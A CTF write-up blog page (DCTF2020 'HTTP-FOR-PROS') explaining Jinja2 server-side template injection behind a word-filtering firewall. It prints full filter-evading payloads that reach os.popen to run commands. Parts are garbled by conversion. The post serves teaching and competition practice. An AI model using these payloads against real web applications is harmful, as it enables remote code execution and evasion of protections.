@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        HTTP-FOR-PROS ::
+        Xabifk
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content=" HTTP-FOR-PROS # Proof of flag # FLAG = CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}
+Summary of the vulnerabilities identified # The application is vulnerable to Server Side Template Injection via the content GET parameter and can be used to get code execution on the system. It is not very straightforward since there is also a Web Application Firewall that is filtering our requests and looking for forbidden words in our requests. The solution is to use Python String formatting in order to split the forbidden words so that they won&rsquo;t be matched.
+"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2020/12/http-for-pros/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTTP-FOR-PROS">
+  <meta name="twitter:description" content="HTTP-FOR-PROS # Proof of flag # FLAG = CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}
+Summary of the vulnerabilities identified # The application is vulnerable to Server Side Template Injection via the content GET parameter and can be used to get code execution on the system. It is not very straightforward since there is also a Web Application Firewall that is filtering our requests and looking for forbidden words in our requests. The solution is to use Python String formatting in order to split the forbidden words so that they won’t be matched.">
+
+
+
+<meta property="og:url" content="/posts/2020/12/http-for-pros/">
+  <meta property="og:site_name" content="Xabifk">
+  <meta property="og:title" content="HTTP-FOR-PROS">
+  <meta property="og:description" content="HTTP-FOR-PROS # Proof of flag # FLAG = CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}
+Summary of the vulnerabilities identified # The application is vulnerable to Server Side Template Injection via the content GET parameter and can be used to get code execution on the system. It is not very straightforward since there is also a Web Application Firewall that is filtering our requests and looking for forbidden words in our requests. The solution is to use Python String formatting in order to split the forbidden words so that they won’t be matched.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2020-12-31T00:00:00+00:00">
+    <meta property="article:modified_time" content="2020-12-31T00:00:00+00:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="DCTF2020">
+    <meta property="article:tag" content="CTF">
+      <meta property="og:see_also" content="/posts/2020/12/alien-inclusion/">
+      <meta property="og:see_also" content="/posts/2020/12/basic-coms/">
+      <meta property="og:see_also" content="/posts/2020/12/bazooka/">
+      <meta property="og:see_also" content="/posts/2020/12/bro64/">
+      <meta property="og:see_also" content="/posts/2020/12/darkmagic/">
+      <meta property="og:see_also" content="/posts/2020/12/dumb-discord/">
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >xabifk</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            Show more
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/series">Series</a></li>
+              
+            
+              
+                <li><a href="/tags">Tags</a></li>
+              
+            
+              
+                <li><a href="/archive">Timeline</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/posts">Posts</a></li>
+      
+    
+      
+        <li><a href="/series">Series</a></li>
+      
+    
+      
+        <li><a href="/tags">Tags</a></li>
+      
+    
+      
+        <li><a href="/archive">Timeline</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">HTTP-FOR-PROS</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-12-31
+        </span>
+
+        
+          
+        
+      
+
+      
+        <span class="post-author"
+          >— Written by Xabifk</span
+        >
+
+
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          <a href="/tags/writeup/">#writeup</a>&nbsp;
+        
+          <a href="/tags/dctf2020/">#DCTF2020</a>&nbsp;
+        
+          <a href="/tags/ctf/">#CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+
+    <div class="post-content">
+      
+      <h2 id="http-for-pros">
+  <strong>HTTP-FOR-PROS</strong>
+  <a href="#http-for-pros" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="proof-of-flag">
+  <strong>Proof of flag</strong>
+  <a href="#proof-of-flag" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>FLAG = CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}</p>
+<h3 id="summary-of-the-vulnerabilities-identified">
+  <strong>Summary of the vulnerabilities identified</strong>
+  <a href="#summary-of-the-vulnerabilities-identified" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The application is vulnerable to Server Side Template Injection via the content GET parameter and can be used to get code execution on the system. It is not very straightforward since there is also a Web Application Firewall that is filtering our requests and looking for forbidden words in our requests. The solution is to use Python String formatting in order to split the forbidden words so that they won&rsquo;t be matched.</p>
+<h3 id="proof-of-solving">
+  <strong>Proof of solving</strong>
+  <a href="#proof-of-solving" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>We begin at a simple page with an input and a search button which accepts text and then pretends to search for it. However we see that it only reflect it on the page.</p>
+<table>
+  <thead>
+      <tr>
+          <th>← → ⊂ ŵ</th>
+          <th>0 🛿 35.198.103.37</th>
+          <th></th>
+          <th></th>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td>http-for-pros</td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td>xd</td>
+          <td>Search</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>$\leftrightarrow$ $\rightarrow$ G</td>
+          <td>۵</td>
+          <td>0 🔏 35.198.1</td>
+          <td>0 <!-- raw HTML omitted -->3.37<!-- raw HTML omitted --> :31612/?conter</td>
+          <td>it=fasfgasga</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>fasfgasga</td>
+          <td>a</td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Trying different e<!-- raw HTML omitted -->the page is susc</td>
+          <td>exploits/injections r<!-- raw HTML omitted -->eptible to SSTI (Se</td>
+          <td>Trying different exploits/injections revolving around the only known parameter we find out that<!-- raw HTML omitted -->the page is susceptible to SSTI (Server Side Template Injection).</td>
+          <td>known parameter w</td>
+          <td>e find out that</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>$\leftrightarrow$ &gt; G</td>
+          <td>۵</td>
+          <td>0 💋 25.19</td>
+          <td><!-- raw HTML omitted -->8.103.37<!-- raw HTML omitted --> :31612/?co</td>
+          <td>ntent={{3**3}}</td>
+          <td></td>
+      </tr>
+  </tbody>
+</table>
+<p>Searching for classic payloads on google we find out this article published by the <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">OnSecurity</a> <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">team</a> which I cannot recommend enough. However trying different payloads we soon notice that there is also a firewall in place which prevents us from doing any on the public exploits</p>
+<p>and we will need a custom exploitation. (In total I have encountered around 10 blacklist filters, but according to their IDs there are more than 25 around).</p>
+<p><img src="attachments/_page_30_Picture_1.jpeg" alt=""></p>
+<p>&lsquo;id&rsquo;).read()}} in an obfuscated way.</p>
+<p>We start with the &ldquo;request&rdquo; object and see that it is not on the filter and won&rsquo;t need any obfuscation. Our payload so far is ?content={{request}} which will result in the templating engine outputting our object.</p>
+<p>However when we want to build &ldquo;request.application&rdquo; we get blocked. So we will need to use python formatting to build it.</p>
+<p><img src="attachments/_page_30_Picture_7.jpeg" alt=""></p>
+<p>We can use the trick from the OnSecurity article to build the &ldquo;application&rdquo;. Our payload will look something like this:</p>
+<p><img src="attachments/_page_30_Picture_10.jpeg" alt=""></p>
+<p>?content={{request|attr(request.args.f1|format(request.args.app))}}&amp;f1=%s&amp;app=application</p>
+<p>Continuing in this style we will build the payloads for each field and they will look as such:</p>
+<ul>
+<li>Request.application.__globals__ (it required more formatting since the firewall appears to be looking for the word globals in all parameters and the _ are important and need to be added as well.</li>
+<li>o ?content={{request|attr(request.args.f1|format(request.args.app))|attr(request .args.f6|format(request.args.u,request.args.u,request.args.glo,request.args.b als,request.args.u,request.args.u))}}&amp;f1=%s&amp;f6=%s%s%s%s%s%s&amp;app=ap plication&amp;u=_&amp;glo=glo&amp;bals=bals</li>
+<li>request.application.__globals__.__builtins__</li>
+<li>o ?content={{request|attr(request.args.f1|format(request.args.app))|attr(request .args.f6|format(request.args.u,request.args.u,request.args.glo,request.args.b als,request.args.u,request.args.u))|attr(request.args.f6|format(request.args.u, request.args.u,request.args.ge,request.args.titem,request.args.u,request.arg s.u))(request.args.f6|format(request.args.u,request.args.u,request.args.buil,r equest.args.tins,request.args.u,request.args.u))}}&amp;f1=%s&amp;f6=%s%s%s%s% s%s&amp;app=application&amp;u=_&amp;glo=glo&amp;bals=bals&amp;ge=ge&amp;titem=titem&amp;buil=bui l&amp;tins=tins</li>
+<li>request.application.__globals__.__builtins__.__import__(&lsquo;os&rsquo;)</li>
+<li>o ?content={{request|attr(request.args.f1|format(request.args.app))|attr(request .args.f6|format(request.args.u,request.args.u,request.args.glo,request.args.b als,request.args.u,request.args.u))|attr(request.args.f6|format(request.args.u, request.args.u,request.args.ge,request.args.titem,request.args.u,request.arg s.u))(request.args.f6|format(request.args.u,request.args.u,request.args.buil,r equest.args.tins,request.args.u,request.args.u))|attr(request.args.f6|format(re quest.args.u,request.args.u,request.args.ge,request.args.titem,request.args. u,request.args.u))(request.args.f6|format(request.args.u,request.args.u,requ est.args.imp,request.args.ort,request.args.u,request.args.u))(%27os%27)}}&amp;f 1=%s&amp;f6=%s%s%s%s%s%s&amp;app=application&amp;u=_&amp;glo=glo&amp;bals=bals&amp;ge =ge&amp;titem=titem&amp;buil=buil&amp;tins=tins&amp;cl=cl&amp;ass=ass&amp;imp=imp&amp;ort=ort</li>
+<li>request.application.__globals__.__builtins__.__import__(&lsquo;os&rsquo;).popen(&lsquo;cat flag&rsquo;)</li>
+<li>o ?content={{request|attr(request.args.f1|format(request.args.app))|attr(request .args.f6|format(request.args.u,request.args.u,request.args.glo,request.args.b als,request.args.u,request.args.u))|attr(request.args.f6|format(request.args.u, request.args.u,request.args.ge,request.args.titem,request.args.u,request.arg s.u))(request.args.f6|format(request.args.u,request.args.u,request.args.buil,r equest.args.tins,request.args.u,request.args.u))|attr(request.args.f6|format(re quest.args.u,request.args.u,request.args.ge,request.args.titem,request.args. u,request.args.u))(request.args.f6|format(request.args.u,request.args.u,requ est.args.imp,request.args.ort,request.args.u,request.args.u))(%27os%27)|attr (request.args.f1|format(request.args.po))(request.args.f1|format(request.args .pw))}}&amp;f1=%s&amp;f6=%s%s%s%s%s%s&amp;app=application&amp;u=_&amp;glo=glo&amp;bals= bals&amp;ge=ge&amp;titem=titem&amp;buil=buil&amp;tins=tins&amp;cl=cl&amp;ass=ass&amp;imp=imp&amp;ort=o rt&amp;po=popen&amp;pw=cat+flag</li>
+<li>request.application.__globals__.__builtins__.__import__(&lsquo;os&rsquo;).popen(&rsquo;ls&rsquo;).read()</li>
+<li>o ?content={{request|attr(request.args.f1|format(request.args.app))|attr(request .args.f6|format(request.args.u,request.args.u,request.args.glo,request.args.b als,request.args.u,request.args.u))|attr(request.args.f6|format(request.args.u, request.args.u,request.args.ge,request.args.titem,request.args.u,request.arg s.u))(request.args.f6|format(request.args.u,request.args.u,request.args.buil,r equest.args.tins,request.args.u,request.args.u))|attr(request.args.f6|format(re</li>
+</ul>
+<p>quest.args.u,request.args.u,request.args.ge,request.args.titem,request.args. u,request.args.u))(request.args.f6|format(request.args.u,request.args.u,requ est.args.imp,request.args.ort,request.args.u,request.args.u))(%27os%27)|attr (request.args.f1|format(request.args.po))(request.args.f1|format(request.args .pw))|attr(request.args.f1|format(request.args.re))()}}&amp;f1=%s&amp;f6=%s%s%s% s%s%s&amp;app=application&amp;u=_&amp;glo=glo&amp;bals=bals&amp;ge=ge&amp;titem=titem&amp;buil= buil&amp;tins=tins&amp;cl=cl&amp;ass=ass&amp;imp=imp&amp;ort=ort&amp;po=popen&amp;pw=cat+flag&amp;re =read</p>
+<p>(colored to help differentiate easier between the component of each command)</p>
+<p>After building this entire parameter we can read and submit the flag.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h"
+              >Read other posts</span
+            >
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/posts/2020/12/dumb-discord/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">DUMB-DISCORD</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/posts/2020/12/kalf-game/">
+                  <span class="button__text">KALF GAME</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >xabifk</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2025 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+  </body>
+</html>
